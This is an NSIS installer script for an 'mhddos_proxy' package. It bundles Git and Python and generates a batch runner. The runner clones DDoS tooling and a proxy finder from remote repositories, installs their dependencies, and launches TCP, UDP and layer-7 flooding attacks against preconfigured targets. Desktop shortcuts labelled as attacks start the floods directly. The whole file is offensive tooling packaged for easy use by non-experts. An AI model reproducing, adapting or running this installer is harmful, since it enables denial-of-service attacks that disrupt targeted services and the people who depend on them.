Var uninstallerPath

Section "-hidden"

    ;Search if mhddos_proxy_installer is already installed.
    FindFirst $0 $1 "$uninstallerPath\${UNINSTALLER_NAME}.exe"
    FindClose $0
    StrCmp $1 "" done

    ;Run the uninstaller of the previous install.
    DetailPrint $(inst_unist)
    ExecWait '"$uninstallerPath\${UNINSTALLER_NAME}.exe" /S _?=$uninstallerPath'
    Delete "$uninstallerPath\${UNINSTALLER_NAME}.exe"
    RMDir "$uninstallerPath"

    done:

SectionEnd

Var info_down_btn
Var info_label_1
Var info_label_2
Var info_font

Function win7_info
${If} ${IsWin7}
  ; custom font definitions
  CreateFont $info_font "Microsoft Sans Serif" "9.75" "700"
  
  ; === info (type: Dialog) ===
  nsDialogs::Create 1018
  Pop $0
	
  !insertmacro MUI_HEADER_TEXT $(inf_title) $(inf_subtitle)
  
  ; === down_btn (type: Button) ===
  ${NSD_CreateButton} 217u 106u 64u 15u $(inf_button)
  Pop $info_down_btn
  ${NSD_OnClick} $info_down_btn download_updater
  
  ; === label_1 (type: Label) ===
  ${NSD_CreateLabel} 8u 20u 280u 28u $(inf_lable_1)
  Pop $info_label_1
  SendMessage $info_label_1 ${WM_SETFONT} $info_font 0
  
  ; === label_2 (type: Label) ===
  ${NSD_CreateLabel} 8u 71u 273u 22u $(inf_lable_2)
  Pop $info_label_2
  
	nsDialogs::Show
${EndIf}
FunctionEnd

Function download_updater
    ExecShell "open" "https://update7.simplix.info/UpdatePack7R2.exe" 
FunctionEnd

Section
  SectionIn RO # Just means if in component mode this is locked

  ;Set output path to the installation directory.
  SetOutPath $INSTDIR

  ;Store installation folder in registry
  WriteRegStr HKLM "Software\${PRODUCT}" "" $INSTDIR

  ;Registry information for add/remove programs
  
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayName" "${PRODUCT}"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "UninstallString" '"$INSTDIR\${UNINSTALLER_NAME}.exe"'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayIcon" '"$INSTDIR\haydamaks.ico",0'
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "Publisher" "MHDDoS Proxy Installer"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "URLInfoAbout" "https://github.com/OleksandrBlack/mhddos_proxy_installer"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayVersion" "${PRODUCT_VERSION}"
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoModify" 1
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoRepair" 1
  WriteUninstaller "${UNINSTALLER_NAME}.exe"
  ${GetSize} "$INSTDIR" "/S=0K" $0 $1 $2
  IntFmt $0 "0x%08X" $0
  WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "EstimatedSize" "$0"

  ;Create optional start menu shortcut for uninstaller and Main component
  CreateDirectory "$SMPROGRAMS\${PRODUCT}"
  CreateShortCut "$SMPROGRAMS\${PRODUCT}\Uninstall ${PRODUCT}.lnk" "$INSTDIR\${UNINSTALLER_NAME}.exe" "" "$INSTDIR\${UNINSTALLER_NAME}.exe" 0

  ;Create uninstaller
  WriteUninstaller "${UNINSTALLER_NAME}.exe"
SectionEnd

Section
  SectionIn RO
  SetOutPath ${GIT_DIR}

  File /r "requirements\git\*"
  
SectionEnd

Section
	SectionIn RO
	SetOutPath ${PYTHON_DIR}
 
	${If} ${RunningX64}
		File /r "requirements\python\x64\*"
	${Else}
		File /r "requirements\python\x86\*"
	${EndIf}  
SectionEnd

Section ;RUNNER
  SetOutPath $INSTDIR
  
  FileOpen $9 runner.bat w
  FileWrite $9 "@ECHO off$\r$\n"
  FileWrite $9 "SET PATH=${PYTHON_DIR};${PYTHON_DIR}\Scripts;${GIT_DIR}\git;%PATH%$\r$\n"
  FileWrite $9 "CLS$\r$\n"
  FileWrite $9 "COLOR 0A$\r$\n"
  
  FileWrite $9 ":MAIN$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='' goto MAIN_INFO)$\r$\n"

  FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy' goto CLONE_MHDDOS_PROXY)$\r$\n"
  ;FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
  
  FileWrite $9 ":run_clone_proxy_finder$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_proxy_finder' goto clone_proxy_finder)$\r$\n"
  FileWrite $9 ":run_proxy_finder$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-proxy_finder' goto proxy_finder)$\r$\n"
  
  FileWrite $9 ":run_haydamaks_tcp$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp' goto haydamaks_tcp)$\r$\n"
  FileWrite $9 ":run_haydamaks_udp$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp' goto haydamaks_udp)$\r$\n"
  FileWrite $9 ":run_haydamaks_l7$\r$\n"
  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_l7' goto haydamaks_l7)$\r$\n"
  ;FileWrite $9 ":run_haydamaks_tcp_beta$\r$\n"
  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_tcp_beta' goto haydamaks_tcp_beta)$\r$\n"
  ;FileWrite $9 ":run_haydamaks_udp_beta$\r$\n"
  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-haydamaks_udp_beta' goto haydamaks_udp_beta)$\r$\n"
  
  FileWrite $9 ":MAIN_INFO$\r$\n"
  FileWrite $9 "ECHO.$\r$\n"
  FileWrite $9 "ECHO 1. Run Haydamaks TCP Attack$\r$\n"
  FileWrite $9 "ECHO 2. Run Haydamaks UDP Attack$\r$\n"
  FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
  FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
  FileWrite $9 "if '%choice%'=='1' goto haydamaks_tcp$\r$\n"
  FileWrite $9 "if '%choice%'=='2' goto haydamaks_udp$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":CLONE_MHDDOS_PROXY$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "git clone ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "python -m pip install --upgrade setuptools$\r$\n"
  FileWrite $9 "python -m pip install --upgrade pip$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  ;FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
  ;FileWrite $9 "CD $INSTDIR$\r$\n"
  ;FileWrite $9 "git clone -b feature-async ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  ;FileWrite $9 "git pull$\r$\n"
  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  ;FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":clone_proxy_finder$\r$\n"
  FileWrite $9 "CD $INSTDIR$\r$\n"
  FileWrite $9 "git clone ${proxy_finder_src} ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":proxy_finder$\r$\n"
  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
  FileWrite $9 "ECHO Cheack Update proxy_finder$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Proxy Finder (mhddos_proxy)$\r$\n"
  FileWrite $9 "python finder.py$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":haydamaks_tcp$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attack Haydamaks TCP Target$\r$\n"
  FileWrite $9 "python runner.py ${haydamaks_tcp_target}$\r$\n"
  FileWrite $9 "goto END$\r$\n"
 
  FileWrite $9 ":haydamaks_udp$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attack Haydamaks UDP Target$\r$\n"
  FileWrite $9 "python runner.py ${haydamaks_udp_target}$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  FileWrite $9 ":haydamaks_l7$\r$\n"
  FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
  FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  FileWrite $9 "git pull$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Cheack requirements$\r$\n"
  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  FileWrite $9 "ECHO OK$\r$\n"
  FileWrite $9 "ECHO Start Attack Haydamaks L7 Target$\r$\n"
  FileWrite $9 "python runner.py ${haydamaks_l7_target}$\r$\n"
  FileWrite $9 "goto END$\r$\n"
  
  ;FileWrite $9 ":haydamaks_tcp_beta$\r$\n"
  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  ;FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  ;FileWrite $9 "git pull$\r$\n"
  ;FileWrite $9 "ECHO OK$\r$\n"
  ;FileWrite $9 "ECHO Cheack requirements$\r$\n"
  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  ;FileWrite $9 "ECHO OK$\r$\n"
  ;FileWrite $9 "ECHO Start Attack Haydamaks TCP Target BETA$\r$\n"
  ;FileWrite $9 "python runner.py ${haydamaks_tcp_target} --debug$\r$\n"
  ;FileWrite $9 "goto END$\r$\n"
  
  ;FileWrite $9 ":haydamaks_udp_beta$\r$\n"
  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
  ;FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
  ;FileWrite $9 "git pull$\r$\n"
  ;FileWrite $9 "ECHO OK$\r$\n"
  ;FileWrite $9 "ECHO Cheack requirements$\r$\n"
  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
  ;FileWrite $9 "ECHO OK$\r$\n"
  ;FileWrite $9 "ECHO Start Attack Haydamaks UDP Target BETA$\r$\n"
  ;FileWrite $9 "python runner.py ${haydamaks_udp_target} --debug$\r$\n"
  ;FileWrite $9 "goto END$\r$\n"

  FileWrite $9 ":END$\r$\n"
  FileWrite $9 "EXIT$\r$\n"
  FileClose $9
SectionEnd

Section	"mhddos_proxy";INSTALL MHDDOS_PROXY
  SectionIn RO
  SetOutPath $INSTDIR
 
  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy"'

SectionEnd

;Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
;  SectionIn RO
;  SetOutPath $INSTDIR
; 
;  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
;  
;SectionEnd

;Proxy Finder
Section	/o	$(inst_pf_req)

  SetOutPath $INSTDIR
  
  File "resources\itarmy_proxy.ico"
  
  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_proxy_finder"'
  
  CreateShortCut "$DESKTOP\$(inst_pf_req).lnk" "$INSTDIR\runner.bat" "-proxy_finder" "$INSTDIR\itarmy_proxy.ico" 0

SectionEnd

;Haydamaks
Section	$(inst_haydamaks_req)

  SetOutPath $INSTDIR
  
  File "resources\haydamaks.ico"
  
  CreateShortCut "$DESKTOP\TCP $(inst_haydamaks_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp" "$INSTDIR\haydamaks.ico" 0
  CreateShortCut "$DESKTOP\UDP $(inst_haydamaks_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_udp" "$INSTDIR\haydamaks.ico" 0
  CreateShortCut "$DESKTOP\L7 $(inst_haydamaks_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_l7" "$INSTDIR\haydamaks.ico" 0

SectionEnd

;Haydamaks BETA
;Section	$(inst_haydamaks_beta_req)
;
;  SetOutPath $INSTDIR
;  
;  File "resources\haydamaks_beta.ico"
;  
;  CreateShortCut "$DESKTOP\TCP $(inst_haydamaks_beta_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_tcp_beta" "$INSTDIR\haydamaks_beta.ico" 0
;  CreateShortCut "$DESKTOP\UDP $(inst_haydamaks_beta_req).lnk" "$INSTDIR\runner.bat" "-haydamaks_udp_beta" "$INSTDIR\haydamaks_beta.ico" 0
;
;SectionEnd


Function .onInit

  !insertmacro MUI_LANGDLL_DISPLAY


  ;Search if mhddos_proxy_installer is already installed.
  FindFirst $0 $1 "$INSTDIR\${UNINSTALLER_NAME}.exe"
  FindClose $0
  StrCmp $1 "" done

  ;Copy old value to var so we can call the correct uninstaller
  StrCpy $uninstallerPath $INSTDIR

  ;Inform the user
  MessageBox MB_OKCANCEL|MB_ICONINFORMATION $(inst_uninstall_question) /SD IDOK IDOK done
  Quit

  done:

FunctionEnd